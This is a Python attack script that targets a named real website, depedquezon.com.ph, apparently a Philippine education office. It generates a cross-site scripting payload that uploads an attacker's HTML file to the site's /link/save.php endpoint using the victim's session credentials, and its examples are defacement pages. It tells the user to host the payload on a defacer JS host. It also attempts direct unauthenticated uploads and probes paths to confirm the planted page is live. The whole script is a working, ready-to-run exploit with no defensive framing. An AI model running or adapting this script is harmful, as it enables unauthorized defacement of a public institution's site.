#!/usr/bin/env python3
"""
depedxss.py - Upload .html file via depedquezon.com.ph XSS

Usage:
  python3 depedxss.py --html deface.html
  python3 depedxss.py --html anon.html --output payload.js
"""

import argparse, base64, json, sys, urllib.parse
from pathlib import Path

try:
    import requests
except ImportError:
    print("[!] pip install requests")
    sys.exit(1)

requests.packages.urllib3.disable_warnings()

BASE = "https://depedquezon.com.ph"

XSS_URL = 'https://depedquezon.com.ph/?result='

def main():
    parser = argparse.ArgumentParser(description="Upload HTML via depedquezon XSS")
    parser.add_argument("--html", "-f", required=True, help="Your .html file to upload")
    parser.add_argument("--output", "-o", default="xss_payload.js", help="Output JS file")
    args = parser.parse_args()

    html_path = Path(args.html)
    if not html_path.exists():
        print(f"[!] File not found: {args.html}")
        sys.exit(1)

    html_content = html_path.read_text(encoding="utf-8", errors="replace")
    filename = html_path.name
    html_b64 = base64.b64encode(html_content.encode()).decode()

    # JS payload that runs in depedquezon.com.ph context via XSS
    js_payload = f"""(function(){{
var b=new Blob([atob('{html_b64}')],{{type:'text/html'}});
var d=new DataTransfer();
d.items.add(new File([b],'{filename}',{{type:'text/html'}}));
var fd=new FormData();
fd.append('file',d.files[0],'{filename}');
fetch('/link/save.php',{{method:'POST',body:fd,mode:'same-origin',credentials:'include'}})
.then(function(r){{if(r.status==200){{console.log('[OK] Uploaded {filename}')}}}})
.catch(function(e){{console.log('[FAIL]',e)}});
}})();"""

    # Save JS payload
    Path(args.output).write_text(js_payload)
    print(f"[✓] JS payload saved to: {args.output}")
    print(f"[✓] Size: {len(js_payload)} bytes")
    print()

    # Print what to paste on jso.defacer.id
    print("=" * 60)
    print("  PASTE THIS ON YOUR JS HOST (jso.defacer.id)")
    print("=" * 60)
    print()
    print(js_payload)
    print()
    print("=" * 60)
    print("  XSS TRIGGER URL")
    print("=" * 60)
    print()
    print(f"  {XSS_URL}")
    print()

    # Test direct upload anyway
    print("=" * 60)
    print("  DIRECT UPLOAD TEST (may not work but worth trying)")
    print("=" * 60)
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0"
    
    r = s.post(f"{BASE}/link/save.php",
               files={"file": (filename, html_content.encode(), "text/html")},
               timeout=30, verify=False)
    print(f"  POST /link/save.php  ->  Status: {r.status_code}")

    # Also try other field names
    for field in ["uploaded_file", "userfile", "fileToUpload"]:
        r2 = s.post(f"{BASE}/link/save.php",
                    files={field: (filename, html_content.encode(), "text/html")},
                    timeout=15, verify=False)
        print(f"  field='{field}' -> {r2.status_code}")

    # Check if file appeared
    print()
    for path in [f"/data_files/{filename}", f"/link/{filename}", f"/img/{filename}", f"/{filename}"]:
        try:
            r3 = s.get(f"{BASE}{path}", timeout=10, verify=False)
            if r3.status_code == 200:
                print(f"  [✓] FOUND: {BASE}{path} ({len(r3.text)} bytes)")
            else:
                print(f"  [ ] {r3.status_code} {BASE}{path}")
        except:
            pass

if __name__ == "__main__":
    main()
